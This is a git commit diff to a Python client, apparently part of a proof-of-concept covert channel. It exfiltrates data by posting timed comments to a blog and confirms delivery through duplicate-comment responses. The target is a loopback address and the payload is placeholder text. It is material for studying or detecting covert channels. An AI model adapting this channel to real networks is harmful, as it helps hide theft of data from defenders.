773c30f0780fb39cde821a34b847e80be0520e5a
accidentalrebel <accidentalrebel@gmail.com>
2021-08-14 12:51:00 +0800

    Created the send_data function.

--- src/client.py
+++ src/client.py
@@ -13,24 +13,29 @@ target_blog = "http://127.0.0.3/"
 exfil_channel_id = 5
 ack_channel_id = 7
 
-send_time_slot = 11
-confirm_time_slot = 33
+btm_send_time_slot = 10
+btm_confirm_time_slot = 30
 
-while True:
-    delay_to_timeslot(send_time_slot)
+def send_data(data, send_time_slot, confirm_time_slot):
+    while True:
+        delay_to_timeslot(send_time_slot)
 
-    print("Triggered at: " + str(datetime.datetime.now().time()))
+        print("Triggered at: " + str(datetime.datetime.now().time()))
 
-    message_id = generate_random_string(10)
-    response = submit_comment(target_blog, exfil_channel_id, message_id + ": Exfiltrated Data Test")
-    print(response.html_response)
+        response = submit_comment(target_blog, exfil_channel_id, data)
+        print(response.html_response)
 
-    delay_to_timeslot(confirm_time_slot)
-    response = response = submit_comment(target_blog, ack_channel_id, message_id)
-    print("## html_response: " + str(response.html_response))
-    if "Duplicate" in response.html_response:
-        # If it's duplicated, that means that the server successfully got the message.
-        print("[INFO] Message submitted and confirmed.")
-        break
-    else:
-        print("[INFO] Message was not received by server. Resending...")
+        if confirm_time_slot:
+            delay_to_timeslot(confirm_time_slot)
+            response = response = submit_comment(target_blog, ack_channel_id, message_id)
+            print("## html_response: " + str(response.html_response))
+            if "Duplicate" in response.html_response:
+                # If it's duplicated, that means that the server successfully got the message.
+                print("[INFO] Message submitted and confirmed.")
+                break
+            else:
+                print("[INFO] Message was not received by server. Resending...")
+
+message_id = generate_random_string(10)
+message = message_id + ": Exfiltrated Data Test"
+send_data(message, btm_send_time_slot, btm_confirm_time_slot)
